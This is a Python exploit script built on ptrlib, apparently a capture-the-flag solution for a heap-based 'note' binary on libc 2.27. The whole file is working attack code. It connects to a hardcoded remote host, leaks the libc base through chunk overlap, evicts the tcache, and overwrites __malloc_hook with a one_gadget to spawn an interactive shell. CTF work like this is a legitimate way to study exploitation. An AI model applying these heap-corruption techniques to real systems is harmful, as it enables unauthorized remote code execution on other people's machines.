from ptrlib import *

def add(size):
    sock.sendlineafter(": ", "1")
    sock.sendlineafter(": ", str(size))
    return
def edit(index, data):
    sock.sendlineafter(": ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendafter(": ", data)
    return
def show(index):
    sock.sendlineafter(": ", "3")
    sock.sendlineafter(": ", str(index))
    return sock.recvline().rstrip(b'*')
def copy(src, dst):
    sock.sendlineafter(": ", "4")
    sock.sendlineafter(": ", str(src))
    sock.sendlineafter(": ", str(dst))
    return
def delete(index):
    sock.sendlineafter(": ", "5")
    sock.sendlineafter(": ", str(index))
    return

libc = ELF("./libc-2.27.so")
#sock = Process("./note")
sock = Socket("34.82.101.212", 10001)
libc_main_arena = 0x3ebc40
libc_one_gadget = 0x4f2c5
call_realloc = 0x1524d0

# leak libc
add(0x38)  # 0
add(0x18)  # 1
add(0x3f8) # 2
add(0x68)  # 3
edit(3, (p64(0)+p64(0x21))*6)
edit(0, b"A"*0x2f)
copy(0, 1)
edit(1, b"B"*0x18+p64(0x431))
delete(2)
libc_base = u64(show(1)[0x20:0x28]) - libc_main_arena - 0x60
logger.info("libc base = " + hex(libc_base))
delete(0)
delete(3)

# evict tache
add(0x68) # 0
for i in range(7):
    add(0x68) # 2
    delete(2)
delete(0)

# house of spirit
edit(1, b'B'*0x18+p64(0x71)+p64(libc_base + libc.symbol('__malloc_hook') - 0x23))
add(0x68) # 0
add(0x68) # 2
payload = b'\x00'*0xb
payload += p64(libc_base + libc_one_gadget)
payload += p64(libc_base + call_realloc)
edit(2, payload)

# get the shell!
sock.sendlineafter(": ", "1")
sock.sendlineafter(": ", "123")

sock.interactive()
